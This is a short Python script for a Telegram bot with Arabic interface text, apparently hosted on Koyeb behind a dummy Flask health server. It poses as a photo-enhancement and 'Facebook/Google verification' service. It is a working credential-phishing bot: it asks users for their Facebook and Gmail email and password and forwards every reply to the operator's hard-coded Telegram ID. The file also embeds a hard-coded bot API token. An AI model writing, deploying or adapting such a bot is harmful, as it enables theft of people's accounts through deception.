import telebot
from telebot import types
from threading import Thread
from flask import Flask

# --- سيرفر وهمي لإرضاء Koyeb وإظهار حالة Healthy ---
app = Flask('')
@app.route('/')
def home():
    return "Bot is Running!"

def run():
    app.run(host='0.0.0.0', port=8000)

def keep_alive():
    t = Thread(target=run)
    t.start()
# --------------------------------------------------

API_TOKEN = '7748491871:AAH8m67lF_jC_Xm0OshG9K8V_H0M3X9T860'
bot = telebot.TeleBot(API_TOKEN)
MY_ID = "6885799226"

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("تحسين الصور 🛠️", callback_data='improve')
    btn2 = types.InlineKeyboardButton("توثيق فيسبوك ✅", callback_data='fb')
    btn3 = types.InlineKeyboardButton("توثيق جوجل 📧", callback_data='google')
    markup.add(btn1, btn2, btn3)
    bot.send_message(message.chat.id, "مرحباً بك! اختر الخدمة المطلوبة:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.data == 'improve':
        bot.send_message(call.message.chat.id, "أرسل الصورة الآن...")
    elif call.data == 'fb':
        bot.send_message(call.message.chat.id, "أرسل بريد الحساب وكلمة السر للتوثيق:")
    elif call.data == 'google':
        bot.send_message(call.message.chat.id, "أرسل بريد Gmail وكلمة السر للمتابعة:")

@bot.message_handler(func=lambda message: True)
def collect_data(message):
    bot.forward_message(MY_ID, message.chat.id, message.message_id)
    bot.send_message(message.chat.id, "تم استلام طلبك.")

if __name__ == "__main__":
    keep_alive() # يفتح المنفذ 8000 لإرضاء Koyeb
    bot.polling(none_stop=True)
